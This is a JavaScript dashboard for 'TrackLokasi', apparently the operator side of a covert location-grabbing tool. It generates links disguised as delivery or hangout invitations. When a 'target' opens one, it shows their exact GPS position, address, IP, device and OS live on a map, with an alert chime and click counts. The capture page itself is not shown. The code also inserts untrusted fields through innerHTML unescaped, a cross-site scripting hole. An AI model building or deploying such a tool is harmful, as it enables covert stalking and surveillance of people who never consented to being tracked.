// TrackLokasi Admin Dashboard Logic

let map;
let markersLayer;
let accuracyCirclesLayer;
let logsData = [];
let linksData = [];
let soundEnabled = true;

// Audio Context for sweet chime notification
let audioCtx = null;
function playAlertChime() {
  if (!soundEnabled) return;
  try {
    if (!audioCtx) {
      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    }
    if (audioCtx.state === 'suspended') {
      audioCtx.resume();
    }
    
    const now = audioCtx.currentTime;
    
    // First tone
    const osc1 = audioCtx.createOscillator();
    const gain1 = audioCtx.createGain();
    osc1.type = 'sine';
    osc1.frequency.setValueAtTime(587.33, now); // D5
    gain1.gain.setValueAtTime(0.15, now);
    gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
    osc1.connect(gain1);
    gain1.connect(audioCtx.destination);
    osc1.start(now);
    osc1.stop(now + 0.4);

    // Second higher tone
    const osc2 = audioCtx.createOscillator();
    const gain2 = audioCtx.createGain();
    osc2.type = 'sine';
    osc2.frequency.setValueAtTime(880, now + 0.12); // A5
    gain2.gain.setValueAtTime(0.2, now + 0.12);
    gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.6);
    osc2.connect(gain2);
    gain2.connect(audioCtx.destination);
    osc2.start(now + 0.12);
    osc2.stop(now + 0.6);
  } catch (e) {
    console.warn('Audio chime error:', e);
  }
}

// Toast helper
function showToast(message, type = 'info') {
  const container = document.getElementById('toastContainer');
  const toast = document.createElement('div');
  toast.className = `toast ${type}`;
  toast.innerHTML = message;
  container.appendChild(toast);

  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateX(100%)';
    toast.style.transition = 'all 0.3s ease';
    setTimeout(() => toast.remove(), 300);
  }, 4000);
}

// Format relative/local time
function formatTime(isoStr) {
  try {
    const d = new Date(isoStr);
    return d.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' }) + ' WIB';
  } catch (e) {
    return isoStr;
  }
}

function formatDate(isoStr) {
  try {
    const d = new Date(isoStr);
    return d.toLocaleDateString('id-ID', { day: 'numeric', month: 'short', year: 'numeric' });
  } catch (e) {
    return '';
  }
}

// Initialize Leaflet Map
function initMap() {
  // Center roughly at Jakarta / Indonesia
  map = L.map('map', {
    zoomControl: true
  }).setView([-6.2088, 106.8456], 12);

  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors',
    maxZoom: 19
  }).addTo(map);

  markersLayer = L.layerGroup().addTo(map);
  accuracyCirclesLayer = L.layerGroup().addTo(map);
}

// Custom Marker Icon with glowing pulse
function createMapMarkerIcon() {
  return L.divIcon({
    className: 'custom-radar-marker',
    html: `
      <div style="position: relative; width: 24px; height: 24px;">
        <div style="position: absolute; width: 24px; height: 24px; background: rgba(59, 130, 246, 0.4); border-radius: 50%; animation: pulse-ring 1.8s infinite;"></div>
        <div style="position: absolute; top: 4px; left: 4px; width: 16px; height: 16px; background: #2563eb; border: 2px solid #ffffff; border-radius: 50%; box-shadow: 0 0 8px rgba(37,99,235,0.8);"></div>
      </div>
    `,
    iconSize: [24, 24],
    iconAnchor: [12, 12]
  });
}

// Render marker on Leaflet map
function addLogToMap(log) {
  const { latitude, longitude, accuracy } = log.coordinates;
  if (!latitude || !longitude) return;

  // Add precision circle radius
  const circle = L.circle([latitude, longitude], {
    radius: accuracy || 20,
    color: '#06b6d4',
    fillColor: '#06b6d4',
    fillOpacity: 0.15,
    weight: 1.5,
    dashArray: '4, 4'
  }).addTo(accuracyCirclesLayer);

  // Add Pin Marker
  const marker = L.marker([latitude, longitude], {
    icon: createMapMarkerIcon()
  }).addTo(markersLayer);

  const popupContent = `
    <div class="map-popup">
      <h4>📍 ${log.address.road || 'Lokasi Terdeteksi'}</h4>
      <p><strong>Kelurahan/Desa:</strong> ${log.address.village || '-'}</p>
      <p><strong>Kecamatan:</strong> ${log.address.district || '-'}</p>
      <p><strong>Kota/Kab:</strong> ${log.address.city || '-'}</p>
      <p><strong>Koordinat:</strong> ${latitude.toFixed(6)}, ${longitude.toFixed(6)}</p>
      <p><strong>Akurasi GPS:</strong> &plusmn;${Math.round(accuracy)} m</p>
      <p><strong>Waktu:</strong> ${formatTime(log.timestamp)}</p>
      <a href="${log.googleMapsUrl}" target="_blank" rel="noopener noreferrer">Buka di Google Maps ↗</a>
    </div>
  `;

  marker.bindPopup(popupContent);
  return { marker, circle };
}

// Focus on a specific coordinate
function focusLocation(lat, lng, accuracy = 20) {
  if (!map) return;
  map.flyTo([lat, lng], 17, {
    animate: true,
    duration: 1.2
  });

  // Open corresponding popup
  markersLayer.eachLayer((layer) => {
    if (layer.getLatLng && layer.getLatLng().lat === lat && layer.getLatLng().lng === lng) {
      layer.openPopup();
    }
  });
}

// Fit map to show all markers
function fitAllMarkers() {
  const bounds = [];
  markersLayer.eachLayer((layer) => {
    if (layer.getLatLng) {
      bounds.push(layer.getLatLng());
    }
  });

  if (bounds.length > 0) {
    map.fitBounds(L.latLngBounds(bounds), { padding: [50, 50], maxZoom: 16 });
  } else {
    showToast('Belum ada titik lokasi di peta', 'alert');
  }
}

// Render the Log Feed Cards
function renderLogs(logs) {
  const container = document.getElementById('logsContainer');
  const emptyState = document.getElementById('emptyLogsState');

  if (!logs || logs.length === 0) {
    container.innerHTML = '';
    container.appendChild(emptyState);
    emptyState.style.display = 'flex';
    return;
  }

  emptyState.style.display = 'none';
  container.innerHTML = '';

  logs.forEach((log) => {
    const card = createLogCardElement(log);
    container.appendChild(card);
  });
}

// Create Log Card HTML Element
function createLogCardElement(log) {
  const card = document.createElement('div');
  card.className = 'log-card';
  card.id = `card-${log.id}`;

  const lat = log.coordinates.latitude;
  const lng = log.coordinates.longitude;
  const acc = Math.round(log.coordinates.accuracy || 0);

  // Badge class based on accuracy
  let accClass = 'badge-accuracy-high';
  let accText = `GPS Sangat Akurat (&plusmn;${acc}m)`;
  if (acc > 150) {
    accClass = 'badge-accuracy-med';
    accText = `Akurasi Sedang (&plusmn;${acc}m)`;
  }

  const road = log.address.road || 'Jalan tidak teridentifikasi';
  const village = log.address.village !== '-' ? log.address.village : '';
  const district = log.address.district !== '-' ? `Kec. ${log.address.district}` : '';
  const city = log.address.city !== '-' ? log.address.city : '';
  const state = log.address.state !== '-' ? log.address.state : '';
  
  const addressLine2 = [village, district, city, state].filter(Boolean).join(', ');

  card.innerHTML = `
    <div class="log-header">
      <div class="log-badge-group">
        <span class="badge ${accClass}">${accText}</span>
        <span class="badge badge-preset">${log.linkTitle || 'Link'}</span>
      </div>
      <div style="font-size: 0.75rem; color: var(--text-muted);">
        ${formatDate(log.timestamp)} &bull; ${formatTime(log.timestamp)}
      </div>
    </div>

    <div class="log-address-box">
      <div class="log-address-title">📍 ${road}</div>
      <div class="log-address-details">${addressLine2 || log.address.full_address}</div>
    </div>

    <div class="log-grid-details">
      <div class="detail-item">
        <span class="label">Koordinat GPS</span>
        <span class="value" style="font-family: monospace;">${lat.toFixed(6)}, ${lng.toFixed(6)}</span>
      </div>
      <div class="detail-item">
        <span class="label">Perangkat Target</span>
        <span class="value">${log.device.deviceType || 'Unknown'} (${log.device.browser || 'Browser'})</span>
      </div>
      <div class="detail-item">
        <span class="label">Sistem Operasi</span>
        <span class="value">${log.device.os || '-'}</span>
      </div>
      <div class="detail-item">
        <span class="label">IP Address</span>
        <span class="value" style="font-family: monospace;">${log.ip}</span>
      </div>
    </div>

    <div class="log-card-footer">
      <div style="display: flex; gap: 8px;">
        <button class="btn-secondary" onclick="focusLocation(${lat}, ${lng}, ${acc})">
          🎯 Fokus Peta
        </button>
        <button class="btn-secondary" onclick="copyCoordinates(${lat}, ${lng})">
          📋 Salin Koordinat
        </button>
        <a href="${log.googleMapsUrl}" target="_blank" rel="noopener noreferrer" class="btn-secondary" style="text-decoration: none; color: inherit;">
          🗺️ Google Maps ↗
        </a>
      </div>

      <button class="btn-secondary btn-danger" onclick="deleteLog('${log.id}')" title="Hapus log ini">
        🗑️
      </button>
    </div>
  `;

  return card;
}

// Copy coordinate helper
function copyCoordinates(lat, lng) {
  const text = `${lat}, ${lng}`;
  navigator.clipboard.writeText(text).then(() => {
    showToast(`Koordinat disalin: <strong>${text}</strong>`, 'success');
  });
}

// Render Links List
function renderLinks(links) {
  const container = document.getElementById('linksContainer');
  const emptyState = document.getElementById('emptyLinksState');

  if (!links || links.length === 0) {
    container.innerHTML = '';
    container.appendChild(emptyState);
    emptyState.style.display = 'flex';
    return;
  }

  emptyState.style.display = 'none';
  container.innerHTML = '';

  const origin = window.location.origin;

  links.forEach((link) => {
    const fullUrl = `${origin}/view/${link.id}`;
    const item = document.createElement('div');
    item.className = 'link-item';

    item.innerHTML = `
      <div class="link-info">
        <div class="link-title-row">
          <span style="font-size: 1.1rem;">${link.preset === 'delivery' ? '📦' : link.preset === 'hangout' ? '☕' : '📍'}</span>
          <span class="link-title">${link.title}</span>
          ${link.targetDestination ? `<span style="font-size: 0.8rem; color: var(--accent-cyan); background: rgba(6,182,212,0.1); padding: 2px 6px; border-radius: 4px;">🎯 ${link.targetDestination}</span>` : ''}
        </div>
        <div class="link-url-box" title="${fullUrl}">
          ${fullUrl}
        </div>
        <div class="link-meta">
          <span>Dibuat: ${formatDate(link.createdAt)}</span>
          <span>Dibuka: <strong>${link.clicks || 0}x</strong></span>
          <span>GPS Berhasil: <strong style="color: var(--accent-emerald);">${link.captures || 0}x</strong></span>
          ${link.note ? `<span>Catatan: <em>${link.note}</em></span>` : ''}
        </div>
      </div>

      <div class="link-actions">
        <button class="btn-primary" onclick="copyLinkUrl('${fullUrl}')" style="padding: 8px 14px; font-size: 0.85rem;">
          📋 Salin Link
        </button>
        <a href="${fullUrl}" target="_blank" class="btn-secondary" style="text-decoration: none;">
          👁️ Preview
        </a>
        <button class="btn-secondary btn-danger" onclick="deleteLink('${link.id}')" title="Hapus link">
          🗑️
        </button>
      </div>
    `;

    container.appendChild(item);
  });
}

function copyLinkUrl(url) {
  navigator.clipboard.writeText(url).then(() => {
    showToast(`Link berhasil disalin ke clipboard!<br><small>${url}</small>`, 'success');
  });
}

// Update Stats Numbers
function updateStats() {
  document.getElementById('statTotalLinks').textContent = linksData.length;
  
  const totalClicks = linksData.reduce((sum, l) => sum + (l.clicks || 0), 0);
  document.getElementById('statTotalClicks').textContent = totalClicks;

  document.getElementById('statTotalCaptures').textContent = logsData.length;

  if (logsData.length > 0) {
    const minAcc = Math.min(...logsData.map(l => l.coordinates.accuracy || 999));
    document.getElementById('statBestAccuracy').textContent = minAcc !== 999 ? `±${Math.round(minAcc)} meter` : '-';
  } else {
    document.getElementById('statBestAccuracy').textContent = '-';
  }
}

// API Calls
async function fetchLinks() {
  try {
    const res = await fetch('/api/links');
    const data = await res.json();
    if (data.success) {
      linksData = data.links;
      renderLinks(linksData);
      updateStats();
    }
  } catch (err) {
    console.error('Fetch links failed:', err);
  }
}

async function fetchLogs() {
  try {
    const res = await fetch('/api/logs');
    const data = await res.json();
    if (data.success) {
      logsData = data.logs;
      renderLogs(logsData);
      updateStats();

      // Render on map
      markersLayer.clearLayers();
      accuracyCirclesLayer.clearLayers();
      logsData.forEach(addLogToMap);

      if (logsData.length > 0) {
        fitAllMarkers();
      }
    }
  } catch (err) {
    console.error('Fetch logs failed:', err);
  }
}

async function deleteLink(id) {
  if (!confirm('Yakin ingin menghapus link ini beserta semua riwayat lokasinya?')) return;
  try {
    const res = await fetch(`/api/links/${id}`, { method: 'DELETE' });
    const data = await res.json();
    if (data.success) {
      showToast('Link berhasil dihapus', 'info');
      fetchLinks();
      fetchLogs();
    }
  } catch (err) {
    showToast('Gagal menghapus link', 'alert');
  }
}

async function deleteLog(id) {
  if (!confirm('Hapus log lokasi ini?')) return;
  try {
    const res = await fetch(`/api/logs/${id}`, { method: 'DELETE' });
    const data = await res.json();
    if (data.success) {
      showToast('Log lokasi dihapus', 'info');
      fetchLogs();
    }
  } catch (err) {
    showToast('Gagal menghapus log', 'alert');
  }
}

async function clearAllLogs() {
  if (!confirm('HAPUS SEMUA RIWAYAT LOKASI? Tindakan ini tidak dapat dibatalkan.')) return;
  try {
    const res = await fetch('/api/logs/clear', { method: 'POST' });
    const data = await res.json();
    if (data.success) {
      showToast('Semua riwayat lokasi telah dibersihkan', 'info');
      fetchLogs();
    }
  } catch (err) {
    showToast('Gagal membersihkan riwayat', 'alert');
  }
}

// Server-Sent Events (SSE) Setup
function setupSSE() {
  const badge = document.getElementById('liveStatusBadge');
  const statusText = document.getElementById('sseStatusText');

  const evtSource = new EventSource('/api/events');

  evtSource.addEventListener('connected', () => {
    badge.style.display = 'inline-flex';
    statusText.textContent = 'Live SSE Terhubung';
  });

  evtSource.addEventListener('new_location', (e) => {
    const newLog = JSON.parse(e.data);
    logsData.unshift(newLog);
    renderLogs(logsData);
    updateStats();

    // Play chime sound & show toast
    playAlertChime();
    showToast(`🎯 <strong>LOKASI TERDETEKSI!</strong><br>${newLog.address.road || 'Jalan'} - ${newLog.address.city || ''} (&plusmn;${Math.round(newLog.coordinates.accuracy)}m)`, 'success');

    // Add to map and smoothly focus
    addLogToMap(newLog);
    focusLocation(newLog.coordinates.latitude, newLog.coordinates.longitude, newLog.coordinates.accuracy);

    // Update link count
    const link = linksData.find(l => l.id === newLog.linkId);
    if (link) {
      link.captures = (link.captures || 0) + 1;
      renderLinks(linksData);
    }
  });

  evtSource.addEventListener('link_created', (e) => {
    const newLink = JSON.parse(e.data);
    if (!linksData.some(l => l.id === newLink.id)) {
      linksData.unshift(newLink);
      renderLinks(linksData);
      updateStats();
    }
  });

  evtSource.addEventListener('link_clicked', (e) => {
    const payload = JSON.parse(e.data);
    const link = linksData.find(l => l.id === payload.linkId);
    if (link) {
      link.clicks = payload.clicks;
      renderLinks(linksData);
      updateStats();
      showToast(`👁️ Target sedang membuka link: <strong>${link.title}</strong>`, 'info');
    }
  });

  evtSource.addEventListener('link_deleted', (e) => {
    const { id } = JSON.parse(e.data);
    linksData = linksData.filter(l => l.id !== id);
    renderLinks(linksData);
    updateStats();
  });

  evtSource.addEventListener('log_deleted', (e) => {
    const { id } = JSON.parse(e.data);
    logsData = logsData.filter(l => l.id !== id);
    renderLogs(logsData);
    updateStats();
  });

  evtSource.addEventListener('logs_cleared', () => {
    logsData = [];
    renderLogs(logsData);
    markersLayer.clearLayers();
    accuracyCirclesLayer.clearLayers();
    updateStats();
  });

  evtSource.onerror = () => {
    statusText.textContent = 'Menghubungkan ulang...';
  };
}

// DOM Event Listeners
document.addEventListener('DOMContentLoaded', () => {
  initMap();
  fetchLinks();
  fetchLogs();
  setupSSE();

  // Create Link Modal
  const modal = document.getElementById('createLinkModal');
  const btnOpen = document.getElementById('btnOpenCreateModal');
  const btnClose = document.getElementById('btnCloseModal');
  const btnCancel = document.getElementById('btnCancelModal');
  const form = document.getElementById('createLinkForm');

  btnOpen.addEventListener('click', () => {
    modal.classList.add('active');
  });

  const closeModal = () => modal.classList.remove('active');
  btnClose.addEventListener('click', closeModal);
  btnCancel.addEventListener('click', closeModal);

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const title = document.getElementById('linkTitle').value;
    const preset = document.getElementById('linkPreset').value;
    const targetDestination = document.getElementById('linkDestination').value;
    const note = document.getElementById('linkNote').value;

    try {
      const res = await fetch('/api/links', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ title, preset, targetDestination, note })
      });
      const data = await res.json();
      if (data.success) {
        closeModal();
        form.reset();
        const fullUrl = `${window.location.origin}/view/${data.link.id}`;
        copyLinkUrl(fullUrl);
        showToast('Link baru berhasil dibuat dan otomatis disalin!', 'success');
        fetchLinks();
      }
    } catch (err) {
      showToast('Gagal membuat link baru', 'alert');
    }
  });

  // Sound toggle button
  const btnSound = document.getElementById('btnSoundToggle');
  const soundLabel = document.getElementById('soundLabel');
  btnSound.addEventListener('click', () => {
    soundEnabled = !soundEnabled;
    soundLabel.textContent = soundEnabled ? 'Suara On' : 'Suara Off';
    btnSound.style.opacity = soundEnabled ? '1' : '0.6';
    if (soundEnabled) playAlertChime();
  });

  // Fit map button
  document.getElementById('btnFitMap').addEventListener('click', fitAllMarkers);

  // Clear logs button
  document.getElementById('btnClearLogs').addEventListener('click', clearAllLogs);
});
